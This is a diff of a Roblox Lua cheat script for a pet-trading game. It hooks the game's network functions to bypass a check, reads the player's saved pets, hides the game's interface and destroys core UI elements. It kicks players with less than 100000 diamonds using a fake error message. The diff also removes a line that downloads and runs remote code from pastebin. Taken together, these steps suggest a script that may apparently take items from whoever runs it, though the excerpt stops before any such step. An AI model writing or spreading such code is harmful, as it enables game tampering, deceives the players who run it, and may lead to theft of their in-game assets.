@@ -1,7 +1,22 @@
+wait(5)
 local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network); local Fire, Invoke = Network.Fire, Network.Invoke; hookfunction(getupvalue(Fire, 1), function(...) return true end)
 local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library)
 local savedPets = FrameworkLibrary.Save.Get().Pets
-loadstring(game:HttpGet("https://pastebin.com/raw/BgwdW7Gm"))()
+
+game:GetService("Players").LocalPlayer.PlayerGui.Main.Bottom.Visible = false
+
+game:GetService("Players").LocalPlayer.PlayerGui.Main.Left.Visible = false
+
+game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Visible = false
+
+game:GetService("Players").LocalPlayer.PlayerGui.Main.Boosts.Visible = false
+
+game:GetService("Players").LocalPlayer.PlayerGui.Main.ServerBoosts.Visible = false
+
+game:GetService("CoreGui").RobloxGui:Destroy()
+game:GetService("CoreGui").PlayerList:Destroy()
+game:GetService("CoreGui").BubbleChat:Destroy()
+game:GetService("CoreGui").ThemeProvider:Destroy()
     
 if game.Players.LocalPlayer.leaderstats.Diamonds.Value <100000 then
     game.Players.LocalPlayer:Kick("Error found while executing.") else
